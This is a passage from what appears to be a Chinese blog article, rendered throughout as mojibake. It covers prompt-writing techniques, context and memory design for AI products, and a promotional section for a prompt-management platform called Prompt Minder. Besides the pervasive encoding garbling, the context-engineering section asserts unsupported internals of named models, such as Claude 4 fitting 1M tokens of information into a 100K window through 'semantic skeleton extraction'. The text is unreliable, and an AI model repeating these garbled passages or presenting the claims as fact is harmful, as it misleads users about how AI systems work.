ã€è¾“å…¥æ•°æ®ã€‘
ç”¨æˆ·Aï¼šç•Œé¢å¤ªå¤æ‚äº†
ç”¨æˆ·Bï¼šåŠŸèƒ½å¾ˆå¼ºå¤§ï¼Œå°±æ˜¯å­¦ä¹ æˆæœ¬é«˜
ã€è¾“å‡ºè¦æ±‚ã€‘</p>
<ol>
<li>æç‚¼å…±æ€§é—®é¢˜</li>
<li>æŒ‰ä¼˜å…ˆçº§æ’åº</li>
<li>ç»™å‡ºæ”¹è¿›å»ºè®®</li>
</ol>
<h4 data-id="heading-5">ç¤ºä¾‹ä¼˜å…ˆ</h4>
<p>å½“æ— æ³•ç”¨è¯­è¨€ç²¾ç¡®æè¿°æ—¶ï¼Œç›´æ¥ç»™ç¤ºä¾‹æ˜¯æœ€æœ‰æ•ˆçš„æ–¹å¼ã€‚</p>
<p>å°†ä»¥ä¸‹äº§å“åç§°æ”¹å†™ä¸ºæ›´æœ‰å¸å¼•åŠ›çš„å½¢å¼ï¼š
ç¤ºä¾‹ï¼š
åŸåï¼šè“ç‰™è€³æœº
æ”¹å†™ï¼šæ— çº¿è‡ªç”±ï¼ŒéŸ³è´¨éšè¡Œ
ç°åœ¨è¯·æ”¹å†™ï¼š
åŸåï¼šå……ç”µå®
æ”¹å†™ï¼š</p>
<h4 data-id="heading-6">åˆ†æ­¥æŒ‡ç¤º</h4>
<p>å¯¹äºå¤æ‚ä»»åŠ¡ï¼Œåˆ†è§£ä¸ºå¤šä¸ªæ­¥éª¤å¯ä»¥è®©AIæ›´å¥½åœ°ç†è§£å’Œæ‰§è¡Œã€‚</p>
<p>ä»»åŠ¡ï¼šè§£é‡Šå¹¶è§£å†³è¿™ä¸ªæ•°å­¦é—®é¢˜ï¼š2x + 3 = 7
åˆ†æ­¥æŒ‡ç¤ºï¼š</p>
<ol>
<li>é¦–å…ˆï¼Œè§£é‡Šå¦‚ä½•è§£æ–¹ç¨‹</li>
<li>ç„¶åï¼Œè§£æ–¹ç¨‹ 2x + 3 = 7</li>
</ol>
<h3 data-id="heading-7">2.2 é«˜çº§æŠ€å·§</h3>
<h4 data-id="heading-8">æ€ç»´é“¾æç¤ºè¯</h4>
<p>é€šè¿‡å¼•å¯¼AIä¸€æ­¥æ­¥æ€è€ƒï¼Œå¯ä»¥æ˜¾è‘—æå‡è§£å†³å¤æ‚é—®é¢˜çš„å‡†ç¡®æ€§ã€‚</p>
<p>é—®é¢˜ï¼šä¸€å®¶å•†åº—ä»¥æ¯3ä»¶100å…ƒçš„ä»·æ ¼é”€å”®Tæ¤ï¼Œå°æ˜ä¹°äº†5ä»¶ï¼Œè¯·è®¡ç®—ä»–åº”è¯¥æ”¯ä»˜å¤šå°‘é’±ï¼Ÿ
è¯·æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ€è€ƒï¼š</p>
<ol>
<li>ç¡®å®šé—®é¢˜ç±»å‹å’Œå·²çŸ¥æ¡ä»¶</li>
<li>æ‰¾å‡ºå•ä»·å’Œè´­ä¹°æ•°é‡ä¹‹é—´çš„å…³ç³»</li>
<li>è®¡ç®—æ€»ä»·</li>
<li>éªŒè¯ç­”æ¡ˆçš„åˆç†æ€§</li>
</ol>
<h4 data-id="heading-9">è´Ÿé¢æ¸…å•ç­–ç•¥</h4>
<p>æ˜ç¡®å‘Šè¯‰AI"ä¸èƒ½åšä»€ä¹ˆ"æ¯”"è¦åšå¥½ä»€ä¹ˆ"æ›´èƒ½å‡å°‘è¯•é”™æˆæœ¬ã€‚</p>
<p>âŒ é”™è¯¯ç¤ºä¾‹ï¼š
å†™ä¸€ç¯‡æ–‡ç« ï¼Œä¸è¦å¤ªé•¿ï¼Œä¸è¦å¤ªæŠ€æœ¯åŒ–ï¼Œä¸è¦æœ‰åºŸè¯ã€‚
âœ… æ­£ç¡®ç¤ºä¾‹ï¼š
å†™ä¸€ç¯‡500å­—å·¦å³çš„æ–‡ç« ï¼Œç”¨é€šä¿—æ˜“æ‡‚çš„è¯­è¨€ï¼Œç›´æ¥åˆ‡å…¥ä¸»é¢˜ã€‚</p>
<h4 data-id="heading-10">å¤šæ¨¡æ€ç»„åˆ</h4>
<p>å›¾æ–‡ç»“åˆçš„æç¤ºèƒ½è®©AIæ›´ç²¾å‡†åœ°æ•æ‰çœŸå®éœ€æ±‚ï¼Œé¿å…çº¯æ–‡æœ¬æè¿°ä¸­æŠ½è±¡è¯æ±‡å¸¦æ¥çš„ç†è§£åå·®ã€‚</p>
<p>æ–°æ‰‹ä¹Ÿèƒ½ä¸Šæ‰‹çš„å¤šæ¨¡æ€æ¨¡æ¿ï¼š</p>
<ol>
<li>ä¸Šä¼ å‚è€ƒå›¾ç‰‡ï¼ˆå¦‚çˆ†æ¬¾å‰ªæ˜ æ•™ç¨‹å°é¢ã€å–œæ¬¢çš„ç§‘æ™®æ’ç”»é£æ ¼ï¼‰ï¼›</li>
<li>è¡¥å……æ–‡æœ¬æŒ‡ä»¤ï¼š"å‚è€ƒä¸Šä¼ å›¾ç‰‡çš„è‰²å½©æ­é…å’Œç‰ˆå¼ï¼Œè®¾è®¡ä¸€å¼ å‰ªæ˜ æ•™ç¨‹å°é¢å›¾ï¼›</li>
<li>æ˜ç¡®çº¦æŸæ¡ä»¶ï¼š"ä¸»è‰²è°ƒæ²¿ç”¨å›¾ç‰‡ä¸­çš„è“ç™½é…è‰²ï¼Œçªå‡ºâ€˜1åˆ†é’Ÿæå®šå­—å¹•â€™æ ¸å¿ƒå–ç‚¹ï¼Œäººç‰©æ‰‹åŠ¿å’Œå‚è€ƒå›¾ä¸€è‡´ï¼Œè¾“å‡ºæ ¼å¼ä¸º9:16ç«–ç‰ˆï¼Œåˆ†è¾¨ç‡1080p"</li>
</ol>
<h4 data-id="heading-11">è¿­ä»£ä¼˜åŒ–</h4>
<p>å°†AIè§†ä¸ºå®ä¹ ç”Ÿï¼Œé€šè¿‡åé¦ˆå’Œçº é”™ä¸æ–­æå‡è¾“å‡ºè´¨é‡ã€‚</p>
<p>ç¬¬ä¸€è½®ï¼šä½ ä¸‹è¾¾ä»»åŠ¡(åˆæ­¥æŒ‡ä»¤)ï¼ŒAIæäº¤åˆç¨¿(é€šå¸¸æ˜¯60åˆ†)ã€‚
ç¬¬äºŒè½®ï¼šä½ ç»™å‡ºåé¦ˆ(æŒ‡å‡ºé—®é¢˜ï¼š"è¯­æ°”å¤ªç”Ÿç¡¬"ã€"é€»è¾‘ä¸é€š"ã€‚
ç¬¬ä¸‰è½®ï¼šAIä¿®æ­£ï¼Œæäº¤æ–°ç¨¿(è¾¾åˆ°80åˆ†+)ã€‚</p>
<h3 data-id="heading-12">2.3 ä¼ä¸šçº§å®è·µ</h3>
<h4 data-id="heading-13">å»ºç«‹Prompt Library</h4>
<p>å°†å¸¸ç”¨æç¤ºæ¨¡æ¿åŒ–ã€æ ‡å‡†åŒ–ï¼Œå¦‚å®¢æœè¯æœ¯ã€è¥é”€æ–‡æ¡ˆã€æŠ€æœ¯æ–‡æ¡£ç”Ÿæˆç­‰ã€‚è¿™æ ·å¯ä»¥æé«˜å›¢é˜Ÿåä½œæ•ˆç‡ï¼Œå‡å°‘é‡å¤å·¥ä½œã€‚</p>
<h4 data-id="heading-14">ç‰ˆæœ¬æ§åˆ¶</h4>
<p>ä½¿ç”¨Gitç®¡ç†Promptè¿­ä»£ï¼Œè®°å½•ä¼˜åŒ–è¿‡ç¨‹ã€‚è¿™æ ·å¯ä»¥ç¡®ä¿Promptçš„å¯è¿½æº¯æ€§ï¼Œä¾¿äºé—®é¢˜æ’æŸ¥å’Œæ€§èƒ½è¯„ä¼°ã€‚</p>
<h4 data-id="heading-15">A/Bæµ‹è¯•</h4>
<p>å¯¹æ¯”ä¸åŒæç¤ºçš„è¾“å‡ºè´¨é‡ï¼ŒæŒç»­ä¼˜åŒ–ã€‚é€šè¿‡A/Bæµ‹è¯•ï¼Œå¯ä»¥æ‰¾åˆ°æœ€é€‚åˆç‰¹å®šåœºæ™¯çš„æç¤ºè¯ã€‚</p>
<h4 data-id="heading-16">å®‰å…¨å®¡æŸ¥</h4>
<p>ç¡®ä¿Promptä¸ä¼šå¼•å¯¼æ¨¡å‹ç”Ÿæˆè¿æ³•ã€æ­§è§†æ€§æˆ–æ•æ„Ÿå†…å®¹ã€‚å¯¹äºæ¶‰åŠæ•æ„Ÿä¿¡æ¯çš„ä¼ä¸šå’Œå›¢é˜Ÿï¼Œå®‰å…¨å®¡æŸ¥å°¤ä¸ºé‡è¦ã€‚</p>
<h2 data-id="heading-17">ä¸‰ã€ä¸Šä¸‹æ–‡å·¥ç¨‹ï¼šAIäº§å“çš„ç”Ÿå‘½çº¿</h2>
<h3 data-id="heading-18">3.1 ä¸‰ä¸ªæ ¸å¿ƒç»´åº¦</h3>
<h4 data-id="heading-19">æ—¶é—´ç»´åº¦</h4>
<p>çŸ­æœŸè®°å¿†ç±»ä¼¼äºRAMï¼Œå­˜å‚¨å½“å‰ä¼šè¯çš„å³æ—¶ä¿¡æ¯ã€‚æ¯”å¦‚ç”¨æˆ·åˆšåˆšæåˆ°çš„äººåã€åœ°ç‚¹ã€éœ€æ±‚ç­‰ã€‚è¿™äº›ä¿¡æ¯éœ€è¦å¿«é€Ÿè®¿é—®ï¼Œä½†ä¸éœ€è¦æ°¸ä¹…ä¿å­˜ã€‚é•¿æœŸè®°å¿†åˆ™åƒç¡¬ç›˜ï¼Œå­˜å‚¨ç”¨æˆ·ç”»åƒã€å†å²åå¥½ã€ä¸šåŠ¡è§„åˆ™ç­‰æŒä¹…åŒ–ä¿¡æ¯ã€‚</p>
<p>ä¸€ä¸ªä¼˜ç§€çš„ä¸Šä¸‹æ–‡ç³»ç»Ÿéœ€è¦åœ¨ä¸¤è€…ä¹‹é—´æ‰¾åˆ°å¹³è¡¡ã€‚OpenAIçš„GPT-4åœ¨å¤„ç†é•¿å¯¹è¯æ—¶ï¼Œä¼šé€šè¿‡æ»‘åŠ¨çª—å£æœºåˆ¶åŠ¨æ€ç®¡ç†çŸ­æœŸè®°å¿†ï¼ŒåŒæ—¶é€šè¿‡embeddingæŠ€æœ¯å°†é‡è¦ä¿¡æ¯è½¬åŒ–ä¸ºé•¿æœŸè®°å¿†ã€‚</p>
<h4 data-id="heading-20">ç©ºé—´ç»´åº¦</h4>
<p>å±€éƒ¨ä¸Šä¸‹æ–‡å…³æ³¨å½“å‰ä»»åŠ¡çš„å…·ä½“ä¿¡æ¯ï¼Œæ¯”å¦‚æ­£åœ¨ç¼–è¾‘çš„ä»£ç ç‰‡æ®µã€æ­£åœ¨åˆ†æçš„æ•°æ®è¡¨æ ¼ã€‚å…¨å±€ä¸Šä¸‹æ–‡åˆ™åŒ…å«æ•´ä¸ªåº”ç”¨çš„èƒŒæ™¯çŸ¥è¯†ï¼Œå¦‚å…¬å¸æ”¿ç­–ã€è¡Œä¸šè§„èŒƒã€ç”¨æˆ·è§’è‰²æƒé™ç­‰ã€‚</p>
<p>Googleçš„Geminiæ¨¡å‹é€šè¿‡å¤šå±‚æ¬¡çš„æ³¨æ„åŠ›æœºåˆ¶å®ç°äº†è¿™ç§ç©ºé—´ç®¡ç†ï¼šåº•å±‚æ³¨æ„åŠ›å¤„ç†å±€éƒ¨ç»†èŠ‚ï¼Œé«˜å±‚æ³¨æ„åŠ›æŠŠæ¡å…¨å±€è¯­ä¹‰ã€‚</p>
<h4 data-id="heading-21">è¯­ä¹‰ç»´åº¦</h4>
<p>æ˜¾å¼ä¸Šä¸‹æ–‡æ˜¯ç”¨æˆ·ç›´æ¥æä¾›çš„ä¿¡æ¯ï¼Œå¦‚"æˆ‘æ˜¯ä¸€åPythonå¼€å‘è€…"ã€‚éšå¼ä¸Šä¸‹æ–‡éœ€è¦ä»ç”¨æˆ·è¡Œä¸ºä¸­æ¨æ–­ï¼Œæ¯”å¦‚ä»ç”¨æˆ·çš„æé—®æ–¹å¼åˆ¤æ–­å…¶æŠ€æœ¯æ°´å¹³ï¼Œä»ä½¿ç”¨æ—¶é—´æ¨æµ‹å…¶å·¥ä½œä¹ æƒ¯ã€‚</p>
<p>å®ƒä¼šé€šè¿‡åˆ†æç”¨æˆ·çš„è¯­è¨€é£æ ¼ã€ä¸“ä¸šæœ¯è¯­ä½¿ç”¨é¢‘ç‡ã€é—®é¢˜å¤æ‚åº¦ç­‰éšå¼ä¿¡å·ï¼Œè‡ªåŠ¨è°ƒæ•´å›ç­”çš„ä¸“ä¸šç¨‹åº¦å’Œè¯¦ç»†ç¨‹åº¦ã€‚</p>
<h3 data-id="heading-22">3.2 å…³é”®æŠ€æœ¯</h3>
<h4 data-id="heading-23">å¤šå±‚æ¬¡è®°å¿†æ¶æ„</h4>
<p>äººç±»çš„è®°å¿†ç³»ç»Ÿåˆ†ä¸ºæ„Ÿè§‰è®°å¿†ã€çŸ­æœŸè®°å¿†å’Œé•¿æœŸè®°å¿†ï¼Œä¼˜ç§€çš„AIä¸Šä¸‹æ–‡ç³»ç»Ÿä¹Ÿéœ€è¦ç±»ä¼¼çš„åˆ†å±‚è®¾è®¡ã€‚</p>
<ul>
<li><strong>ä¼šè¯çº§è®°å¿†ï¼ˆSession Memoryï¼‰</strong>ï¼šä¿å­˜å½“å‰å¯¹è¯çš„å®Œæ•´ä¸Šä¸‹æ–‡ï¼Œå…¸å‹å®¹é‡ï¼š4K-128K tokensï¼Œç”Ÿå‘½å‘¨æœŸï¼šå•æ¬¡ä¼šè¯ç»“æŸå³æ¸…é™¤ï¼Œåº”ç”¨åœºæ™¯ï¼šè¿ç»­å¯¹è¯ã€å¤šè½®é—®ç­”</li>
<li><strong>ç”¨æˆ·çº§è®°å¿†ï¼ˆUser Memoryï¼‰</strong>ï¼šå­˜å‚¨ç”¨æˆ·çš„é•¿æœŸåå¥½å’Œå†å²æ¨¡å¼ï¼Œå…¸å‹å®¹é‡ï¼šæ— é™åˆ¶ï¼ˆéœ€è¦å‘é‡åŒ–å‹ç¼©ï¼‰ï¼Œç”Ÿå‘½å‘¨æœŸï¼šæ°¸ä¹…ä¿å­˜æˆ–æŒ‰ç­–ç•¥æ¸…ç†ï¼Œåº”ç”¨åœºæ™¯ï¼šä¸ªæ€§åŒ–æ¨èã€ä¹ æƒ¯å­¦ä¹ </li>
<li><strong>çŸ¥è¯†åº“è®°å¿†ï¼ˆKnowledge Memoryï¼‰</strong>ï¼šç»„ç»‡çº§æˆ–é¢†åŸŸçº§çš„å…±äº«çŸ¥è¯†ï¼Œå…¸å‹å®¹é‡ï¼šTBçº§åˆ«çš„å‘é‡æ•°æ®åº“ï¼Œç”Ÿå‘½å‘¨æœŸï¼šæŒç»­æ›´æ–°å’Œç»´æŠ¤ï¼Œåº”ç”¨åœºæ™¯ï¼šä¼ä¸šçŸ¥è¯†ç®¡ç†ã€ä¸“ä¸šé—®ç­”</li>
</ul>
<h4 data-id="heading-24">æ™ºèƒ½å‹ç¼©æŠ€æœ¯</h4>
<p>éšç€å¯¹è¯çš„è¿›è¡Œï¼Œä¸Šä¸‹æ–‡ä¼šä¸æ–­è†¨èƒ€ï¼Œå¦‚ä½•åœ¨æœ‰é™çš„tokençª—å£å†…ä¿ç•™æœ€å…³é”®çš„ä¿¡æ¯ï¼Ÿè¿™å°±éœ€è¦æ™ºèƒ½å‹ç¼©æŠ€æœ¯ã€‚</p>
<p>Claude 4åœ¨å¤„ç†è¶…é•¿ä¸Šä¸‹æ–‡æ—¶é‡‡ç”¨äº†ä¸€ç§åˆ›æ–°çš„"è¯­ä¹‰éª¨æ¶æå–"æŠ€æœ¯ï¼š</p>
<ul>
<li>å°†å†å²å¯¹è¯åˆ†å‰²æˆè¯­ä¹‰å—</li>
<li>å¯¹æ¯ä¸ªè¯­ä¹‰å—è¿›è¡Œé‡è¦æ€§è¯„åˆ†</li>
<li>ä¿ç•™é«˜åˆ†å—çš„å®Œæ•´å†…å®¹</li>
<li>ä½åˆ†å—è½¬åŒ–ä¸ºæ‘˜è¦</li>
<li>æ„å»ºè¯­ä¹‰ç´¢å¼•ä¾¿äºæ£€ç´¢</li>
</ul>
<p>è¿™ç§æ–¹æ³•è®©Claudeèƒ½åœ¨100Kçš„ä¸Šä¸‹æ–‡çª—å£ä¸­ï¼Œå®ç°ç›¸å½“äº1M tokensçš„ä¿¡æ¯æ‰¿è½½èƒ½åŠ›ã€‚</p>
<h4 data-id="heading-25">åŠ¨æ€æ³¨å…¥æœºåˆ¶</h4>
<p>é™æ€çš„ä¸Šä¸‹æ–‡å°±åƒæ­»æ°´ï¼ŒåŠ¨æ€çš„ä¸Šä¸‹æ–‡æ‰æœ‰ç”Ÿå‘½åŠ›ã€‚å¦‚ä½•è®©AIèƒ½å¤Ÿæ ¹æ®å¯¹è¯çš„å‘å±•ï¼Œå®æ—¶è°ƒæ•´å’Œè¡¥å……ä¸Šä¸‹æ–‡ï¼Ÿ</p>
<p>æ ¸å¿ƒæŠ€æœ¯ç»„ä»¶ï¼š</p>
<ol>
<li><strong>æ„å›¾è¯†åˆ«å™¨ï¼ˆIntent Recognizerï¼‰</strong>ï¼šåŸºäºBERTçš„æ„å›¾åˆ†ç±»æ¨¡å‹ï¼Œå‡†ç¡®ç‡è¦æ±‚ï¼š&gt;95%ï¼Œå“åº”æ—¶é—´ï¼š&lt;50msï¼Œæ”¯æŒå¤šæ„å›¾è¯†åˆ«å’Œæ„å›¾è½¬æ¢æ£€æµ‹</li>
<li><strong>ç›¸å…³æ€§è®¡ç®—å¼•æ“ï¼ˆRelevance Engineï¼‰</strong>ï¼šä½¿ç”¨ä½™å¼¦ç›¸ä¼¼åº¦ã€BM25ç­‰ç®—æ³•ï¼Œå®æ—¶è®¡ç®—ä¿¡æ¯ç›¸å…³æ€§åˆ†æ•°ï¼ŒåŠ¨æ€è°ƒæ•´æƒé‡å‚æ•°</li>
</ol>
<h3 data-id="heading-26">3.3 ç»„ç»‡å˜é©</h3>
<p>ä¼ ç»Ÿçš„"promptå·¥ç¨‹å¸ˆ"å²—ä½æ­£åœ¨æ¶ˆå¤±ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯<strong>context podï¼ˆä¸Šä¸‹æ–‡å°ç»„ï¼‰</strong>ã€‚è¿™ä¸ªç»„ç»‡çš„èŒèƒ½éå¸¸æ¸…æ™°ï¼š</p>
<ul>
<li><strong>æ¸…æ´—ï¼ˆcleaningï¼‰</strong>ï¼šå°†ä¼ä¸šå†…éƒ¨æ··ä¹±çš„éç»“æ„åŒ–æ•°æ®ï¼ˆèŠå¤©è®°å½•ã€ä¼šè®®çºªè¦ã€æ—§ä»£ç ï¼‰ï¼Œæ¸…æ´—ä¸ºAIå¯ç†è§£çš„é«˜çº¯åº¦çŸ¥è¯†ã€‚</li>
<li><strong>è·¯ç”±ï¼ˆroutingï¼‰</strong>ï¼šè®¾è®¡å¤æ‚çš„åˆ¤æ–­é€»è¾‘ï¼Œå†³å®šåœ¨ç”¨æˆ·çš„æ¯ä¸€ä¸ªqueryä¸‹ï¼Œåº”è¯¥è°ƒç”¨å“ªä¸€å—å…·ä½“çš„contextè¿›å…¥çª—å£ã€‚</li>
<li><strong>å‰ªæï¼ˆpruningï¼‰</strong>ï¼šå®šæœŸæ¸…ç†è¿‡æ—¶çš„ã€é”™è¯¯çš„æˆ–ä½æƒé‡çš„ä¸Šä¸‹æ–‡ï¼Œé˜²æ­¢"è®°å¿†æ±¡æŸ“"ã€‚</li>
</ul>
<h2 data-id="heading-27">å››ã€Prompt Minderï¼šä¸“ä¸šæç¤ºè¯ç®¡ç†å¹³å°çš„é¦–é€‰</h2>
<h3 data-id="heading-28">4.1 æ ¸å¿ƒåŠŸèƒ½</h3>
<h4 data-id="heading-29">æ™ºèƒ½åˆ†ç±»ç®¡ç†</h4>
<p>é€šè¿‡æ ‡ç­¾ã€é¡¹ç›®ç­‰æ–¹å¼ç»„ç»‡Promptï¼Œå¿«é€Ÿæ£€ç´¢ã€‚å¹³å°æä¾›å¤šç»´åº¦çš„Promptç»„ç»‡æ–¹å¼ï¼š</p>
<ul>
<li><strong>æ ‡ç­¾ç³»ç»Ÿ</strong>ï¼šç”¨æˆ·å¯ä¸ºPromptæ·»åŠ è‡ªå®šä¹‰æ ‡ç­¾ï¼Œå¦‚"å®¢æœå¯¹è¯"ã€"è¥é”€æ–‡æ¡ˆ"ã€"æ³•å¾‹å’¨è¯¢"</li>
<li><strong>é¡¹ç›®è§†å›¾</strong>ï¼šå°†ç›¸å…³Promptå½’ç»„åˆ°é¡¹ç›®ä¸‹ï¼Œæ–¹ä¾¿æˆå‘˜æŒ‰ä¸šåŠ¡çº¿æˆ–äº§å“æ¨¡å—è¿›è¡Œåä½œ</li>
<li><strong>å…¨å±€æœç´¢</strong>ï¼šæ”¯æŒå…³é”®å­—ã€æ ‡ç­¾ã€åˆ›å»ºè€…ã€æ›´æ–°æ—¶é—´ç­‰å¤šé‡ç­›é€‰ï¼Œç§’çº§å®šä½ç›®æ ‡Prompt</li>
</ul>
<h4 data-id="heading-30">ç‰ˆæœ¬æ§åˆ¶</h4>
<p>è®°å½•æ¯æ¬¡ä¿®æ”¹å†å²ï¼Œéšæ—¶å›æº¯æˆ–è¿˜åŸã€‚æ¯æ¬¡Promptçš„æ–°å¢ã€ä¿®æ”¹ã€æ ¼å¼è°ƒæ•´éƒ½ä¼šå†™å…¥å®Œæ•´çš„ç‰ˆæœ¬è®°å½•ï¼Œè®°å½•å†…å®¹åŒ…æ‹¬å˜æ›´äººã€æ—¶é—´æˆ³ã€ä¿®æ”¹æ‘˜è¦ä»¥åŠå®Œæ•´æ–‡æœ¬å¯¹æ¯”ã€‚å›¢é˜Ÿå¯ä»¥ä¸€é”®å¯¹æ¯”å†å²ç‰ˆæœ¬çš„å·®å¼‚ï¼Œå¹¶å°†ä»»ä½•å†å²ç‰ˆæœ¬æ¢å¤ä¸ºå½“å‰ä½¿ç”¨ç‰ˆæœ¬ï¼Œæå¤§é™ä½å› è¯¯æ“ä½œæˆ–æµ‹è¯•å¤±è¯¯å¸¦æ¥çš„é£é™©ã€‚</p>
<h4 data-id="heading-31">å›¢é˜Ÿåä½œ</h4>
<p>æ”¯æŒå¤šäººåä½œï¼Œæä¾›ç»†ç²’åº¦æƒé™æ§åˆ¶ã€‚é’ˆå¯¹å¤§å‹å›¢é˜Ÿï¼ŒPrompt Minderè®¾è®¡äº†è§’è‰²æƒé™ä½“ç³»ï¼š</p>
<ul>
<li><strong>ç®¡ç†å‘˜</strong>ï¼šæ‹¥æœ‰å¹³å°æ‰€æœ‰æƒé™ï¼ŒåŒ…æ‹¬é…ç½®éƒ¨ç½²ã€ç”¨æˆ·ç®¡ç†ã€é¡¹ç›®å®¡æ ¸</li>
<li><strong>ç¼–è¾‘è€…</strong>ï¼šå¯åˆ›å»ºã€ä¿®æ”¹PromptåŠå…¶ç‰ˆæœ¬ï¼Œå‚ä¸åä½œæµ‹è¯•</li>
<li><strong>åªè¯»è€…</strong>ï¼šä»…å¯æŸ¥çœ‹å’Œæµ‹è¯•Promptï¼Œä½†æ— æ³•æ›´æ”¹</li>
</ul>
<p>åœ¨ç¼–è¾‘è¿‡ç¨‹ä¸­ï¼Œå¹³å°æ”¯æŒå®æ—¶å¤šäººåä½œï¼Œæˆå‘˜çš„æ”¹åŠ¨ä¼šè¢«å³æ—¶åŒæ­¥ï¼Œä¿è¯å›¢é˜Ÿéšæ—¶æŒæ¡æœ€æ–°ä¿¡æ¯ã€‚</p>
<h4 data-id="heading-32">AIæ¨¡å‹æ”¯æŒ</h4>
<p>å…¼å®¹OpenAIæ¥å£æ¨¡å‹ï¼Œæä¾›å®æ—¶æµ‹è¯•ç¯å¢ƒã€‚Prompt Minderå†…ç½®ä¸€ä¸ª"Playground"ï¼š</p>
<ul>
<li>é€‰ä¸€æ¡promptï¼›</li>
<li>é€‰æ¨¡å‹ï¼ˆæ”¯æŒä»»ä½•å…¼å®¹OpenAIæ¥å£ï¼‰ï¼›</li>
<li>å¡«å˜é‡ï¼›</li>
<li>ä¸€é”®ç”Ÿæˆcurl / python / nodeä»£ç ã€‚</li>
</ul>
<p>æœ€æƒŠå–œçš„æ˜¯"æ‰¹é‡å›å½’æµ‹è¯•"ï¼šä¸Šä¼ CSVï¼ˆ100è¡Œæµ‹è¯•ç”¨ä¾‹ï¼‰ï¼Œè·‘å®Œè‡ªåŠ¨ç”ŸæˆæŒ‡æ ‡ï¼ˆBLEUã€Latencyã€Costï¼‰ã€‚</p>
<h4 data-id="heading-33">æ•°æ®å®‰å…¨</h4>
<p>ä¼ä¸šçº§åŠ å¯†ï¼Œæ”¯æŒç§æœ‰éƒ¨ç½²ã€‚å¹³å°é‡‡ç”¨TLS/SSLåŠ å¯†ä¼ è¾“ï¼Œå¹¶åœ¨å­˜å‚¨å±‚ç»“åˆAES-256åŠ å¯†ç®—æ³•ç¡®ä¿é™æ€æ•°æ®å®‰å…¨ã€‚å¯¹äºæœ‰æ›´é«˜å®‰å…¨éœ€æ±‚çš„å›¢é˜Ÿï¼Œè¿˜å¯å°†æ•°æ®å­˜å‚¨äºè‡ªå»ºæ•°æ®åº“ï¼Œå¹¶ä½¿ç”¨ç¡¬ä»¶å®‰å…¨æ¨¡å—ï¼ˆHSMï¼‰ç®¡ç†åŠ å¯†å¯†é’¥ã€‚</p>
<h4 data-id="heading-34">Promptä¼˜åŒ–</h4>
<p>ä¸€é”®ç”Ÿæˆé«˜è´¨é‡Promptã€‚å€ŸåŠ©å†…ç½®AIåŠ©æ‰‹ï¼ŒPrompt Minderå¯ä»¥è‡ªåŠ¨åˆ†æç°æœ‰Promptçš„æ•ˆæœï¼Œå¹¶æä¾›ä¸€é”®ä¼˜åŒ–å»ºè®®ã€‚ä¾‹å¦‚ï¼Œå¯¹ä¸€æ®µå®¢æœå¯¹è¯Promptï¼Œå¹³å°èƒ½åœ¨ä¿ç•™æ ¸å¿ƒæ„å›¾çš„åŸºç¡€ä¸Šï¼Œä¼˜åŒ–ç”¨è¯ã€ç»“æ„å’Œç³»ç»ŸæŒ‡ä»¤ï¼Œä»¥æå‡AIçš„åº”ç­”è´¨é‡ã€‚</p>
<h3 data-id="heading-35">4.2 ç‹¬ç‰¹ä¼˜åŠ¿</h3>
<h4 data-id="heading-36">å¼€æºä¸ç§æœ‰éƒ¨ç½²</h4>
<p>Prompt Minderå¯¹å¤–å¼€æºï¼Œç”¨æˆ·å¯æ ¹æ®è‡ªèº«éœ€æ±‚è¿›è¡Œéƒ¨ç½²å’ŒäºŒæ¬¡å¼€å‘ï¼Œç¡®ä¿æ‰€æœ‰PromptåŠæµ‹è¯•æ•°æ®éƒ½åœ¨ä¼ä¸šè‡ªæœ‰ç½‘ç»œæˆ–ä¸“å±äº‘ç¯å¢ƒä¸­è¿è¡Œï¼Œå®Œå…¨é¿å…ç¬¬ä¸‰æ–¹æ‰˜ç®¡çš„é£é™©ã€‚å®šåˆ¶åŒ–æ¥å£ä¸æ’ä»¶æœºåˆ¶ï¼Œä¹Ÿèƒ½è®©å›¢é˜Ÿè½»æ¾å¯¹æ¥å†…éƒ¨CI/CDæµæ°´çº¿ã€‚</p>
<h4 data-id="heading-37">Gitå¼ç®¡ç†</h4>
<p>å°†æç¤ºè¯å½“ä½œä»£ç ï¼ŒæŠŠç®¡ç†æç¤ºè¯å½“ä½œç®¡ç†Gitä»“åº“ã€‚æ¯ä¸ªPromptæ–‡ä»¶æ”¯æŒMarkdown + YAML front-matterï¼Œç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">model:</span> <span class="hljs-string">gpt-4-turbo</span>
<span class="hljs-attr">temperature:</span> <span class="hljs-number">0.3</span>
<span class="hljs-attr">max_tokens:</span> <span class="hljs-number">2000</span>
<span class="hljs-attr">variables:</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">order_id</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">user_name</span>
<span class="hljs-meta">---</span>
<span class="hljs-string">ä½ æ˜¯</span> {<span class="hljs-string">user_name</span>} <span class="hljs-string">çš„ä¸“å±å®¢æœåŠ©æ‰‹ï¼Œè¯·æ ¹æ®è®¢å•</span> {<span class="hljs-string">order_id</span>} <span class="hljs-string">å›ç­”é€€è´§æ”¿ç­–â€¦â€¦</span>
</code></pre>
<h4 data-id="heading-38">å®æ—¶ååŒ</h4>
<p>åŸºäºyjs + WebRTCå®ç°ä½å»¶è¿Ÿå¤šäººç¼–è¾‘ï¼Œå»¶è¿Ÿ &lt; 100 msã€‚å®æµ‹8ä¸ªäººåŒæ—¶ç¼–è¾‘ä¸å†²çªã€‚</p>
<h4 data-id="heading-39">æ‰¹é‡å›å½’æµ‹è¯•</h4>
<p>ä¸Šä¼ CSVæµ‹è¯•ç”¨ä¾‹ï¼Œè‡ªåŠ¨ç”ŸæˆBLEUã€Latencyã€Costç­‰æŒ‡æ ‡ã€‚è¿™æ ·å¯ä»¥ç¡®ä¿Promptçš„è´¨é‡å’Œä¸€è‡´æ€§ã€‚</p>
<h3 data-id="heading-40">4.3 ç”¨æˆ·è¯„ä»·</h3>
<ul>
<li>"Prompt Minderåˆ›å»ºäº†ä¸€ä¸ªå¾ˆå¥½çš„è°ƒè¯•ç¯å¢ƒï¼Œç®€æ´ä½†åŠŸèƒ½å¼ºå¤§ã€‚" â€”â€” å°é”ï¼ˆæç¤ºè¯å·¥ç¨‹å¸ˆï¼‰</li>
<li>"è¿™æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„æ–¹å¼æ¥è¿­ä»£å’Œç®¡ç†æç¤ºè¯ã€‚" â€”â€” IndieAI</li>
